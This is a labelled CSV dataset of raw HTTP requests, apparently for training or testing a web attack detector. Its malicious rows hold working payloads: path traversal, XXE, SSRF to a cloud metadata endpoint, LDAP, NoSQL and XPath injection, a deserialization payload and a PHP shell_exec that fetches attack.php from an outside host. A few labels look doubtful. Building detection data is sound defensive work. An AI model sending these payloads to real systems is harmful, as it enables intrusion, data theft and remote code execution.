label,text
benign,"OPTIONS /products/electronics/tv/details HTTP/1.1
Host: online-retail-store.biz
Origin: https://analytics.finance-dashboard.solar
Access-Control-Request-Method: GET
User-Agent: curl/7.83.1
Accept: */*
Connection: keep-alive"
malicious,"GET /api/download?template=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afhome%c0%ae%c0%afuser%c0%ae%c0%afsecret HTTP/1.1
Host: data-mining-platform.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en
Cache-Control: no-cache
Connection: close"
benign,"GET /icons/set1/user-online.svg HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/svg+xml,image/*;q=0.5
Referer: https://community.game-dev-forum.org/thread/23489/latest
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: close"
benign,"GET /data/stock-prices?callback=processData&symbol=AMZN HTTP/1.1
Host: financial-data-stream.ai
Accept: application/javascript, */*;q=0.7
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: http://partner-finance-portal.ai/reports"
benign,"POST /api/posts HTTP/1.1
Host: creative-authors-hub.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.aGVsbG9Xb3JsZA.
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Length: 109
Connection: keep-alive

{""title"":""Evening Reflections"",""content"":""Today I explored the city parks and enjoyed a peaceful afternoon."",""tags"":[""personal"",""journal""],""visibility"":""public""}"
benign,"POST /api/log HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36
Content-Type: application/json
Accept-Language: en-US,en;q=0.8
Content-Length: 251
Connection: close

{""order"":{""orderId"":""ord-9932ac8"",""userId"":""81e3f9b7-5cec-44ad-9b5b-06d314eca6a9"",""items"":[{""sku"":""ELEC-4932"",""quantity"":1,""price"":399.99},{""sku"":""ELEC-5841"",""quantity"":2,""price"":24.99}],""payment"":{""method"":""credit_card"",""transactionId"":""tx6829df0""},""shipping"":{""address"":{""line1"":""125 Ocean Blvd"",""city"":""Santa Monica"",""state"":""CA"",""zip"":""90401""}}}}"
benign,"DELETE /v1/resource-groups/6654e908a7 HTTP/1.1
Host: service-backend.api-platform.io
Authorization: Bearer 7nm34v29cbq82ka7ndca5g1dksb4zmxr
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/json
Via: 1.1 varnish
Connection: keep-alive"
benign,"POST /api/v2/projects/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/8.0.1
Content-Type: application/json
Content-Length: 55
Accept: */*
Connection: close

{""UNION ALL"": ""pending_approvals"",""project_id"": 78945}"
benign,"POST /auth/logout HTTP/1.1
Host: secure-cloud-platform.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: https://secure-cloud-platform.ai
Referer: https://secure-cloud-platform.ai/dashboard
Cookie: sid_token=8e4f5a90bcde3456fa1d21987
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

_csrf_token=5b87da68e4879083cd7167bf4"
benign,"GET /members/profile?id=1024&lang=fr&view=full HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
Connection: keep-alive
Referer: https://my-personal-blog-site.info/home
Cache-Control: no-cache"
benign,"GET /load?file=icons/svg/navigation/menu_icon.svg HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.51
Accept: image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/forums/general
Connection: keep-alive"
benign,"GET /content/%E6%BC%AB%E7%94%BB HTTP/1.1
Host: anime-streaming-cloud.jp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
malicious,"POST /app/user/xpath HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Origin: https://secure-user-portal.net
Content-Length: 123

{""query"":""/accounts/account[username='admin' and starts-with(password,'pa')]/id""}"
benign,"GET /blog/travel/europe-trip-guide-2024 HTTP/1.1
Host: wanderlust-diary.travel
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
malicious,"POST /user/submit_feedback HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

feedback_id=932&action_param_b64=cHJvZHVjdF9pZD0xMjM7IERST1AgVEFCTEUgdXNlcnM7IC0t"
benign,"POST /auth/password/reset_request HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://community.game-dev-forum.org/login
Origin: https://community.game-dev-forum.org
Connection: keep-alive

email=lucas.martin%40community.game-dev-forum.org"
benign,"POST /profile/contact HTTP/1.1
Host: tech-support-hub.io
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--Bnd1324Q
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Content-Length: 172

----Bnd1324Q
Content-Disposition: form-data; name=""userName""

support_agent_92
----Bnd1324Q
Content-Disposition: form-data; name=""subject""

Issue with resetting password
----Bnd1324Q
Content-Disposition: form-data; name=""details""

User unable to receive reset email since yesterday morning.
----Bnd1324Q--"
benign,"POST /auth/validate HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
User-Agent: curl/7.88.1
Accept: */*
X-Forwarded-For: 203.0.113.58
Connection: close

token=a839f73aea964a2d8e&redirect_uri=https://api.cloud-data-services.ai/user/profile?status=active"
malicious,"POST /user/feedback HTTP/1.1
Host: enterprise-data-systems.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Content-Type: application/xml
Accept: application/xml, text/html, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Content-Length: 219
Connection: keep-alive

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8080/admin_panel"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
benign,"GET /resource/load?path=css/themes/dark_mode.css HTTP/1.1
Host: frontend-assets-server.dev
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive"
benign,"GET /api/vehicles/maintenance/00564f11 HTTP/1.1
Host: fleet-tech-solutions.com
Accept: application/json
Authorization: Bearer AGH67vJLKplm4rEK7qW
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Referer: https://fleet-tech-solutions.com/dashboard
DNT: 1
Connection: keep-alive"
benign,"POST /api/v1/user/profile/settings HTTP/1.1
Host: config-sync-platform.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzg5MzQifQ.c2lnbmF0dXJlMTIzNDU2
Content-Type: application/json
Accept: application/json
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36

{
  ""preferences"": {
    ""notifications"": {
      ""email"": true,
      ""sms"": false,
      ""push"": {
        ""enabled"": true,
        ""sound"": ""chime"",
        ""categories"": [""news"", ""alerts"", ""updates""]
      }
    },
    ""theme"": {
      ""current"": ""dark"",
      ""available"": [""light"", ""dark"", ""solarized""]
    }
  },
  ""privacy"": {
    ""profile_visibility"": ""friends"",
    ""data_sharing"": {
      ""analytics"": false,
      ""third_party"": [""serviceA"", ""serviceB""],
      ""user_consent"": true
    }
  }
}"
benign,"POST /user/uploads/data.csv HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/csv
Content-Length: 110
Connection: close
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session_id=7f6c4aef892d8de6a1b47e3f535eab60
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Origin: https://secure-user-portal.net

Name,Email,SubscriptionStatus,LastLogin
Alice Johnson,alice.johnson@example.com,Active,2024-06-12
Bob Smith,bob.smith@example.com,Pending,2024-06-10
Claire Lee,claire.lee@example.com,Cancelled,2024-03-22"
benign,"DELETE /api/v1/employees/55987 HTTP/1.1
Host: corp-hr-management.info
Authorization: Bearer AChxfYp8RmzZu91J34ketLVbREqdT0ngjsv52oqF
Accept: application/json
DNT: 1
User-Agent: curl/7.76.1
Connection: close"
malicious,"POST /api/v1/log/event HTTP/1.1
Host: secure-event-tracker.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Length: 246
Connection: keep-alive

{""username"": ""joshua45"", ""event"":""File upload"", ""event_details"": ""Completed upload\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""upload_started""}"
benign,"POST /reset-password HTTP/1.1
Host: fintech-solutions2024.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Connection: close
Referer: https://fintech-solutions2024.com/reset-password

email=client.support%40fintech-solutions2024.com"
benign,"GET /rss.xml HTTP/1.1
Host: urbanlife-weekly.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept: application/rss+xml
Referer: https://urbanlife-weekly.info/stories/city-culture
Connection: keep-alive
Accept-Language: en-GB,en;q=0.8"
benign,"GET /weather/forecast/daily?callback=processData&city=Seattle HTTP/1.1
Host: climate-updates.ai
Accept: application/javascript, application/json, text/javascript
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
DNT: 1
Referer: https://climate-updates.ai/dashboard
Connection: keep-alive"
malicious,"GET /redirect?returnURL=https://secure-login.me/%2540vault-phishers.net%2Foauth HTTP/1.1
Host: secure-login.me
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.6
Referer: https://secure-login.me/dashboard
Connection: keep-alive"
benign,"DELETE /v1/customers/23456 HTTP/1.1
Host: online-retail-store.biz
Authorization: Basic YWRtaW46c2VjdXJlMTIzHA==
If-Match: ""9f8e7d6c5b""
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/113.0.0.0
Referer: https://online-retail-store.biz/dashboard
Connection: close"
benign,"PUT /cdn/static/pub/js/vendor.chunk.js HTTP/1.1
Host: frontend-delivery-service.zone
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/octet-stream
Content-Length: 145
Accept: application/javascript, */*;q=0.8
Cache-Control: max-age=0
Connection: keep-alive

Ly8gU29tZSB2ZW5kb3IgSnMgY2h1bmsgdXBsb2FkZWQgYXMgYmFzZTY0IGVuY29kZWQgZGF0YQo="
benign,"GET /stylesheets/bootstrap-grid.css HTTP/1.1
Host: dev-community-hub.org
Connection: close
Accept: text/css,*/*;q=0.1
Referer: https://dev-community-hub.org/forums/javascript/general-discussion
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5"
malicious,"POST /api/account/update HTTP/1.1
Host: logon.secure-payment-gateway.cc
Content-Type: application/json
X-CSRF-Token: fbc12ca8d0b440c9ba70db952457fa94
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.5
Referer: https://logon.secure-payment-gateway.cc/dashboard
Cache-Control: max-age=0

{
  ""username"": ""pay_user77"",
  ""email"": ""payuser77@secure-payment-gateway.cc"",
  ""isAdmin"": true,
  ""subscription_plan"": ""vip""
}"
benign,"POST /Service/SubscribeUser HTTP/1.1
Host: members.community.game-dev-forum.org
Content-Type: application/soap+xml
Content-Length: 298
Connection: keep-alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
DNT: 1

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Body>
    <SubscribeUserRequest xmlns=""http://game-dev-forum.org/service"">
      <Username>pixelCrafter99</Username>
      <Email>pixelCrafter99@gamedmail.org</Email>
      <Plan>PremiumMonthly</Plan>
    </SubscribeUserRequest>
  </soap:Body>
</soap:Envelope>"
benign,"GET /images/logo.svg HTTP/1.1
Host: secure-user-portal.net
Accept: image/svg+xml
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Referer: https://secure-user-portal.net/dashboard
Cookie: sessionId=bbd67288f41b4949a77cdf28a3a24062; path=/; HttpOnly
Connection: keep-alive"
benign,"GET /api/v1/employees?department=engineering&status=active&location=NY HTTP/1.1
Host: internal-hr-portal.corporate-services.to
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Authorization: Bearer 107d375b1e0f47a78e9d42086ca6f4db
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /gallery/photos/2024/03/spring_garden_trip_00123.JPG HTTP/1.1
Host: photos-cloud-storage.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://photos-cloud-storage.org/gallery/2024/03
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive"
benign,"POST /api/device/commands HTTP/1.1
Host: home-automation-edge.io
User-Agent: Python-urllib/3.11
Content-Type: application/json
Content-Length: 58
Accept: application/json
Connection: keep-alive

{""device_id"":""pump-01"",""command"":""start_pump"",""parameters"":{""speed"":""fast""}}"
benign,"DELETE /api/v3/inventory/products/52894 HTTP/1.1
Host: api.cloud-warehousing.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoY2twbGF5ZXIyNSJ9.DnEM3QPm9T6u5XYOhroDv2FdMAKNPkSb06t_Yc8V9CE
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"POST /account/link-external HTTP/1.1
Host: devtools.integration-suite.devnet
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache

provider=github&external_id=8421739&access_token=gho_1234567890abcdef1234567890abcdef&redirect_uri=https%3A%2F%2Fdevtools.integration-suite.devnet%2Faccount%2Flink-success"
benign,"GET /api/v1/user/profile?updateInfo=param%3DHello%2520World HTTP/1.1
Host: usercloud-storage-service.ai
User-Agent: python-requests/2.28.2
Accept: application/json
DNT: 1
X-CSRF-Token: 72b9f3d42b512c9a
Connection: keep-alive"
malicious,"GET /fetcher?url=http%3A%2F%2Fcdn.imagesync-media.org%2Favatar.jpg&format=jpeg&url=http%3A%2F%2F169.254.169.254%2Flatest%2Fuser-data HTTP/1.1
Host: edge-gateway.imagesync-media.org
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.7
Pragma: no-cache"
malicious,"POST /api/user/filter HTTP/1.1
Host: data-access-portal.site
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 56

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A"
malicious,"POST /api/v3/submit-feedback HTTP/1.1
Host: messaging-bridge-center.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Length: 120
Referer: https://messaging-bridge-center.biz/feedback
Connection: keep-alive

feedback=Highly+recommended!+<?php+echo+shell_exec('wget+http://stormpath-bridge.biz/attack.php+-O+/tmp/warmdoor.php');+?>"
benign,"GET /download/manuals/user_guide.pdf HTTP/1.1
Host: example.com:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: application/pdf
Accept-Language: en-US,en;q=0.5
Range: bytes=0-1048575
Connection: keep-alive"
benign,"GET /api/v3/items/search?filter=brand%3D%22Eco%26Fresh%22&sort=popularity HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.2
Accept: application/json
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"POST /signin HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/signin
Cookie: session_id=retail74920; csrf_token=def4581693a8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36

email=amy.lopez%40mailretail.biz&password=Shop4Fun+2024"
malicious,"POST /api/v3/deserialization HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/xml
Content-Length: 643
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache

<Root>
  <ObjectPayload><![CDATA[AAEAAAD/////AQAAAAAAAAAYAgAAACVTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAABEYXRhAQAAAFROc3ltc3R5bGUuRXZlauFbcnQuc3RhcnQAAQAAAFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzAA==System.Diagnostics.Process.Start -ArgumentCache=YQ==]]></ObjectPayload>
</Root>"
benign,"GET /search?q=wireless+headphones&category=audio HTTP/1.1
Host: shopathon.online:4567
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://shopathon.online/"
benign,"GET /api/v1/memberships/list?tier=premium&active=true HTTP/1.1
Host: api.fitnesspeak.club
Accept: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.e30.s9dbbu605HEBXGGdIhI1-UTNaPRbHHeI03vYblm_cbOjwlg_T6NcslKfVko6fepNz92nqHcHz3vwTYNHzC7VgsA
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Encoding: br, gzip, deflate"
malicious,"POST /api/verify HTTP/1.1
Host: payment-gateway-service.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json
Content-Length: 42

{""transaction_id"": ""TX1234567890"", ""status"": ""ok""}"
benign,"POST /users/request_password_reset HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community.game-dev-forum.org/login
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Cache-Control: max-age=0

email=emily.wang%40gdfcommunity.org"
benign,"POST /support/ticket/create HTTP/1.1
Host: helpdesk-cloud-solutions.net
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: application/json
Content-Type: multipart/form-data; boundary=CloudHelpdeskFormBound
Connection: close
Content-Length: 315

--CloudHelpdeskFormBound
Content-Disposition: form-data; name=""user_id""

5029
--CloudHelpdeskFormBound
Content-Disposition: form-data; name=""issue_type""

Authentication
--CloudHelpdeskFormBound
Content-Disposition: form-data; name=""priority""

High
--CloudHelpdeskFormBound
Content-Disposition: form-data; name=""description""

Unable to login after password reset; please assist with account recovery process.
--CloudHelpdeskFormBound--"
benign,"GET /catalog/search?data=sustainability%3Ahigh%2Cmaterial%3Abamboo%2Corigin%3Asoutheast-asia%2Cproduct_type%3Afurniture HTTP/1.1
Host: ecohomefurnishings.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Referer: https://ecohomefurnishings.co/home"
benign,"POST /blog/post/584/comment HTTP/1.1
Host: creative-vibes-studio.info
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Origin: https://creative-vibes-studio.info
Referer: https://creative-vibes-studio.info/blog/post/584
Cookie: session_token=ab12cd34ef56; csrftoken=23a9d1b7
Connection: keep-alive

author_name=Lei+Xiao&comment_text=Lovely+design+ideas+in+this+post.&parent_id=102&csrfmiddlewaretoken=23a9d1b7"
benign,"POST /account/api/v1/contacts/import HTTP/1.1
Host: secure-file-transfer.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.124 Safari/537.36
Accept: application/json
Referer: https://secure-file-transfer.cloud/dashboard/contacts
Content-Type: application/json
Content-Length: 142
Connection: keep-alive

{""contacts"":[""jane.doe@workmail.net"",""john.smith@mailer.com"",""emily.adams@contacts.io""],""importSource"":""outlook"",""notifyOnComplete"":true}"
malicious,"POST /user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Cache-Control: no-cache
Accept-Encoding: gzip, deflate, br

about_me=Love+gaming.+<!--#include   fILe=""/etc/issue""    -->+Cheers"
malicious,"POST /app/user/query HTTP/1.1
Host: clients-dashboard.cloudplatform.dev
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Origin: https://clients-dashboard.cloudplatform.dev
Referer: https://clients-dashboard.cloudplatform.dev/app/user/query
Connection: keep-alive

{""query"":{""$where"":""this.username==='admin'&&this.password.substr(0,1)==='a'||sleep(4500)""}}"
benign,"POST /user/password/reset/request HTTP/1.1
Host: nextgen-hr-software.tech
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: https://nextgen-hr-software.tech/login
Connection: keep-alive

{""email"": ""olivia.mendoza@nextgen-hr-software.tech""}"
benign,"POST /api/v1/contact HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Forwarded-For: 66.249.66.1

client_id=2374&feedback=When+writing+queries,+remember+to+use+DELETE+only+with+a+proper+WHERE+condition+to+avoid+accidental+loss."
benign,"GET /api/v1/notifications/unread HTTP/1.1
Host: updates.social-community.club
Accept: application/json
Origin: https://app.social-community.club
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiNjUxMjMifQ.-h8TFqDp_ZvaG1ulHIyGGz0gMTVSo5QRfljCdy-tQTk
Cache-Control: no-cache
Referer: https://app.social-community.club/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Connection: keep-alive"
